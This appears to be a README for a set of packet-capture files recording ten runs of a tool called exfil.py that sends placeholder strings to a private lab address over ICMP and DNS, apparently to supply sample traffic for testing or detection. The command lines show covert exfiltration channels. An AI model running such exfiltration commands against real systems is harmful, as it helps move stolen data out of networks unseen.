Exfil PCAPs
===========

ping_data
---------
The pcap file ping_data.pcap contains the packets associated with the following five runs of exfil.py

$ sudo python ./exfil.py -d AAAABBBBCCCCDDDDEEEE -s 10.230.229.91 ping_data
Sending data to 10.230.229.91 via ICMP.
Data Sent:
AAAABBBBCCCCDDDDEEEE
$ sudo python ./exfil.py -d FFFFGGGGHHHHIIIIJJJJ -s 10.230.229.91 ping_data
Sending data to 10.230.229.91 via ICMP.
Data Sent:
FFFFGGGGHHHHIIIIJJJJ
$ sudo python ./exfil.py -d KKKKLLLLMMMMNNNNOOOO -s 10.230.229.91 ping_data
Sending data to 10.230.229.91 via ICMP.
Data Sent:
KKKKLLLLMMMMNNNNOOOO
$ sudo python ./exfil.py -d PPPPQQQQRRRRSSSSTTTT -s 10.230.229.91 ping_data
Sending data to 10.230.229.91 via ICMP.
Data Sent:
PPPPQQQQRRRRSSSSTTTT
$ sudo python ./exfil.py -d UUUUVVVVWWWWXXXXYYYY -s 10.230.229.91 ping_data
Sending data to 10.230.229.91 via ICMP.
Data Sent:
UUUUVVVVWWWWXXXXYYYY


dns_lookup
----------
The pcap file dns_lookup.pcap contains the packets associated with the following five runs of exfil.py

$ sudo python ./exfil.py -d AAAABBBBCCCCDDDDEEEE -s 10.230.229.91 dns_lookup
Sending data via DNS to 10.230.229.91 on port 53.
Data Sent:
AAAABBBBCCCCDDDDEEEE
$ sudo python ./exfil.py -d FFFFGGGGHHHHIIIIJJJJ -s 10.230.229.91 dns_lookup
Sending data via DNS to 10.230.229.91 on port 53.
Data Sent:
FFFFGGGGHHHHIIIIJJJJ
$ sudo python ./exfil.py -d KKKKLLLLMMMMNNNNOOOO -s 10.230.229.91 dns_lookup
Sending data via DNS to 10.230.229.91 on port 53.
Data Sent:
KKKKLLLLMMMMNNNNOOOO
$ sudo python ./exfil.py -d PPPPQQQQRRRRSSSSTTTT -s 10.230.229.91 dns_lookup
Sending data via DNS to 10.230.229.91 on port 53.
Data Sent:
PPPPQQQQRRRRSSSSTTTT
$ sudo python ./exfil.py -d UUUUVVVVWWWWXXXXYYYY -s 10.230.229.91 dns_lookup
Sending data via DNS to 10.230.229.91 on port 53.
Data Sent:
UUUUVVVVWWWWXXXXYYYY
